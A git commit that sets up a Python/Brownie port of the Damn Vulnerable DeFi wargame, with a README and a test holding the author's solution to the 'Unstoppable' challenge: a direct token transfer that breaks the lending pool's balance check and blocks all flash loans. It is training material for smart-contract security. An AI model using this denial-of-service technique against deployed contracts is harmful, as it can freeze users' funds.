1365a896124b9cb1116a936c5aa071387fc98c16
Felix Schlegel <schlegel.felix@gmail.com>
2022-01-27 10:39:39 +0100

    initial commit. Unstoppable challenge

---
+++ README.md
@@ -0,0 +1,13 @@
+# Damn Vulnerable DeFi
+
+This is a fork of [damn vulnerable defi](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0), an ethereum wargame consisting of a series of challenges in which DeFi smart contracts need to be hacked.
+
+Here, I implemented everything in brownie instead of the javascript used in the original repo. It also contains my solutions (beware of spoilers).
+
+See <https://www.damnvulnerabledefi.xyz/> for the descriptions of the challenges.
+
+## Notes
+
+- Initial commit. Only the *unstoppable* challenge is implemented so far. More to follow...
+
+- Make sure you have openzeppelin-contracts (4.4.2) imported via the brownie package manager.
---
+++ tests/unstoppable/test_unstoppable.py
@@ -0,0 +1,43 @@
+from brownie import (accounts, Wei, DamnValuableToken,
+                     UnstoppableLender, ReceiverUnstoppable, ReceiverAttacker)
+import pytest
+
+TOKENS_IN_POOL = Wei('1000000 ether')
+INITIAL_ATTACKER_TOKEN_BALANCE = Wei('100 ether')
+
+
+def test_unstoppable():
+    # SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
+
+    deployer = accounts[0]
+    attacker = accounts[1]
+    someUser = accounts[2]
+
+    token = DamnValuableToken.deploy({"from": deployer})
+    pool = UnstoppableLender.deploy(token.address, {"from": deployer})
+
+    token.approve(pool.address, TOKENS_IN_POOL, {"from": deployer})
+    pool.depositTokens(TOKENS_IN_POOL, {"from": deployer})
+
+    token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE, {
+                   "from": deployer})
+
+    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
+    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_TOKEN_BALANCE
+
+    # Show that its possible for someUser to take out a flash loan
+    receiver_contract = ReceiverUnstoppable.deploy(
+        pool.address, {"from": someUser})
+    receiver_contract.executeFlashLoan(10, {"from": someUser})
+
+    # ** CODE YOUR EXPLOIT HERE **
+
+    # SOLUTION:
+    # assertion on line 39 in the pool contract will fail
+    token.transfer(pool.address, INITIAL_ATTACKER_TOKEN_BALANCE,
+                   {"from": attacker})
+
+    # ** SUCCESS CONDITIONS **
+    # It is no longer possible to take a flash loan
+    with pytest.raises(AttributeError):
+        receiver_contract.executeFlashLoan(10, {"from": someUser})
